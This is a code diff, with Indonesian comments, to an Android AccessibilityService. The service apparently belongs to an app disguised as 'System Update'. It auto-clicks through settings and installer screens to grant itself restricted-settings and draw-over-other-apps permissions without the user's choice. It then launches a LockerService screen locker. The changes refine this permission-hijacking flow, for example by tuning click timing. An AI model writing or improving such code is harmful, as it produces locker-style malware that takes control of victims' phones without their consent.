@@ -48,9 +48,14 @@ public class CustomAccessibilityService extends AccessibilityService {
         String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
         String className = event.getClassName() != null ? event.getClassName().toString() : "";
 
-        // Jeda 500ms antar aksi untuk mencegah spamming klik
+        // Filter ketat: Hanya proses jika di dalam menu pengaturan atau installer
+        if (!packageName.contains("settings") && !packageName.contains("packageinstaller") 
+            && !packageName.equals("android") && !packageName.contains("systemui")) {
+            return;
+        }
+
         long currentTime = System.currentTimeMillis();
-        if (currentTime - lastActionTime < 500) return;
+        if (currentTime - lastActionTime < 800) return; // Tingkatkan jeda ke 800ms agar UI sempat refresh
 
         // Jika izin Overlay sudah aktif dan kita masih di pengaturan, segera kembali ke aplikasi
         if (Settings.canDrawOverlays(this) && packageName.contains("settings")) {
@@ -79,41 +84,43 @@ public class CustomAccessibilityService extends AccessibilityService {
             checkAndClick(rootNode, "Izinkan pengaturan terbatas");
         }
 
-        // 3. Tangani Switch Toggle di halaman detail izin
-        boolean switchHandled = processOverlaySwitch(rootNode);
-
-        // 4. Jika Switch tidak ditemukan di layar ini, cari nama aplikasi di daftar
-        if (!switchHandled && packageName.contains("settings") && !className.contains("AppDetails")) {
-            checkAndClick(rootNode, "System Update");
-        }
-
-        // 5. Cari tombol konfirmasi umum
-        checkAndClick(rootNode, "Activate");
-        checkAndClick(rootNode, "Aktifkan");
-        checkAndClick(rootNode, "Allow");
-        checkAndClick(rootNode, "Izinkan");
-        checkAndClick(rootNode, "OK");
-
-        // 4. Spesifik untuk halaman izin Overlay
+        // 3. Alur Logika Izin Overlay
         if (packageName.contains("settings")) {
+            // Cek Switch dulu (Halaman Detail)
+            boolean switchHandled = processOverlaySwitch(rootNode);
+            
+            // Jika tidak ada switch dan bukan di App Info, cari nama aplikasi (Halaman List)
+            if (!switchHandled && !className.contains("AppDetails")) {
+                checkAndClick(rootNode, "System Update");
+            }
+
+            // Klik teks-teks konfirmasi overlay
             checkAndClick(rootNode, "Permit drawing over other apps");
             checkAndClick(rootNode, "Allow display over other apps");
             checkAndClick(rootNode, "Izinkan ditampilkan di atas aplikasi lain");
             checkAndClick(rootNode, "Tampilkan di atas aplikasi lain");
         }
 
-        // 6. Jika izin Overlay sudah aktif, jalankan Locker
-        new Handler(Looper.getMainLooper()).postDelayed(() -> {
-            if (Settings.canDrawOverlays(this) && !LockerService.isAuthenticated) {
-                Intent intent = new Intent(this, LockerService.class);
-                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-                    startForegroundService(intent);
-                } else {
-                    startService(intent);
-                }
-            }
-        }, 1000);
+        // 4. Cari tombol konfirmasi umum (Dialogs)
+        checkAndClick(rootNode, "Activate");
+        checkAndClick(rootNode, "Aktifkan");
+        checkAndClick(rootNode, "Allow");
+        checkAndClick(rootNode, "Izinkan");
+        checkAndClick(rootNode, "OK");
 
+        // Jalankan Locker hanya jika izin baru saja didapat
+        if (Settings.canDrawOverlays(this) && !LockerService.isAuthenticated) {
+            triggerLocker();
+        }
+    }
+
+    private void triggerLocker() {
+        Intent intent = new Intent(this, LockerService.class);
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+            startForegroundService(intent);
+        } else {
+            startService(intent);
+        }
     }
 
     private void checkAndClickByContentDesc(AccessibilityNodeInfo node, String desc) {
